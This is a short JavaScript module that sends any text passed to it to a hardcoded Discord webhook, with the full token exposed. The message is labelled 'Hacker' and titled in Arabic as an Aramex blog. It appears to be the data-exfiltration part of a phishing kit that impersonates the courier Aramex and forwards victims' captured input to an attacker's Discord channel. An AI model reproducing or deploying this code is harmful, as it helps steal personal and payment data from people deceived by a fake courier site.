import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1327293966026014731/bPmGDa-gxCerdUHnsgEuwlrmb9q1E02yqpfk3oq_1Zkg1hyTrZIjmiXmuxfZ1ZKlLpxR",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
